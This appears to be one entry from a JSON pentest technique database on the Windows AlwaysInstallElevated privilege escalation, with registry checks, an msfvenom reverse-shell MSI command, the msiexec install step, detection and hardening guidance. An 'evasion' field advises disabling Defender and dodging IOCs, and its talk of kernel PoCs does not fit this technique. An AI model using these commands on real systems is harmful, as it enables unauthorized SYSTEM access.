      "id": "always-install-elevated",
      "name": "AlwaysInstallElevated - Malicious MSI",
      "command": "msiexec /i c:\\path\\aie.msi /quiet /qn /norestart",
      "description": "When both AlwaysInstallElevated registry keys are 1, any MSI installs as SYSTEM. Confirm both keys, generate an MSI payload, and run it with msiexec.",
      "opsec": "loud",
      "mitre": [
        "T1548"
      ],
      "exam": "exam-ok",
      "defense": {
        "why_it_works": "When both HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated and HKLM\\...\\AlwaysInstallElevated are set to 1, all MSI installations run with SYSTEM privileges regardless of the invoking user's rights. A malicious .msi generated with msfvenom then elevates to SYSTEM when installed by any user.",
        "prerequisites": "Both HKCU and HKLM AlwaysInstallElevated registry values set to 1. Ability to run msiexec. A malicious .msi file placed on the system.",
        "impact": "Arbitrary code execution as SYSTEM for any local user, enabling full system compromise, persistence, and further escalation.",
        "detection": "Registry reads on AlwaysInstallElevated keys by standard user (reconnaissance). msiexec execution with unusual .msi file. SharpUp/PowerUp reporting AlwaysInstallElevated enabled. Event 4657: AlwaysInstallElevated registry key set.",
        "artifacts": "Registry: AlwaysInstallElevated = 1 in HKCU and HKLM | Process: msiexec.exe executing malicious .msi | Event 4657: registry key modification",
        "prevention": "Never enable AlwaysInstallElevated — there is no legitimate production use case. Audit both registry paths regularly. Use GPO to enforce both keys to 0 (disabled). Deploy SharpUp/PowerUp scans in defensive mode to detect misconfiguration.",
        "misconfiguration": "Group Policy misconfiguration or deliberate setting of AlwaysInstallElevated = 1 in both HKCU and HKLM by administrators who want users to install software without UAC prompts.",
        "vulnerable_config": "# Registry confirms misconfiguration:\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# AlwaysInstallElevated = 0x1\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# AlwaysInstallElevated = 0x1\n\n# Exploit:\nmsfvenom -p windows/shell_reverse_tcp -f msi > malicious.msi\nmsiexec /i C:\\Users\\user\\malicious.msi /quiet /qn /norestart",
        "secure_config": "# Disable AlwaysInstallElevated\nreg add HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f\nreg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated /t REG_DWORD /d 0 /f\n\n# Enforce via GPO:\n# Computer Configuration > Admin Templates > Windows Components\n# > Windows Installer > Always install with elevated privileges = Disabled",
        "sources": [
          "HTB M26",
          "MITRE T1218.007"
        ],
        "evasion": "Run the PoC in-memory (reflective load) rather than dropping the EXE; disable/neuter Defender first if you already have admin; rename the binary to dodge static IOCs; kernel PoCs are unstable — test against a snapshot to avoid crashing the target."
      },
